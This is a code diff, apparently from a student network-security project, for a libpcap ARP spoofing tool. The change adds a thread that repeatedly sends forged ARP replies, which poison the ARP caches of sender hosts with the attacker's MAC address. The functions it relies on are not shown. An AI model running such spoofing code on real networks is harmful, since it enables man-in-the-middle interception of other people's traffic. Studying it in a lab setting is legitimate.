@@ -80,9 +80,20 @@ int main(int argc, char* argv[]) {
 	const u_char* packet;
 	EthArpPacket first_reply_packet;
 
+	pthread_t* thread = (pthread_t*)malloc(sizeof(pthread_t));
+	infect_argv* thread_argv = (infect_argv*)malloc(sizeof(infect_argv));
+	thread_argv->handle = handle;
+	thread_argv->size_ = arp_table.size();
+	thread_argv->arp_table_ = attack_data_table;
+
 	for(int i = 0; i < arp_table.size(); i++){
 		set_arp_packet2(&first_reply_packet, attack_data_table[i].sender_ip, attack_data_table[i].sender_mac, attack_data_table[i].target_ip, attack_data_table[i].attacker_ip, attack_data_table[i].attacker_mac);
 		send_arp(handle, first_reply_packet);
+	}
+
+	int thread_res = pthread_create(thread, NULL, arp_infect_thread, (void*)thread_argv);
+	if(thread_res != 0){
+		printf("[error] ARP INFECT THREAD CREATE FAILED\n");
 	}
 
 	while(true){
@@ -101,6 +112,7 @@ int main(int argc, char* argv[]) {
 			}
 		}
 	}
-	
+
+	pthread_join(*thread, NULL);
 	pcap_close(handle);
 }
